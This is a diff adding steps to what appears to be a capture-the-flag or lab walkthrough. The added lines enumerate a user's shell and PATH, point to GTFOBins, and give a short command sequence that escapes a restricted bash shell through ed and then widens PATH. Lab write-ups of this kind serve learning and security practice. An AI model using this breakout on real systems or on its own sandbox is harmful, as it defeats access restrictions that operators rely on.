@@ -1,6 +1,33 @@
 The web-related files are usually stored in the /var/www/html folder, so that's where we are going start.
 
 ```
+echo $SHELL
+```
+
+```
+echo $PATH
+```
+
+```
+ls -la /home/eleanor/bin
+```
+
+Go to  [GTFOBins](https://gtfobins.org/gtfobins)
+
+Find out how to breakout
+
+---
+
+BREAKOUT OF RBASH
+
+```
+ed
+!'/bin/bash'
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+
+```
 cd /var/www/html
 ```
 
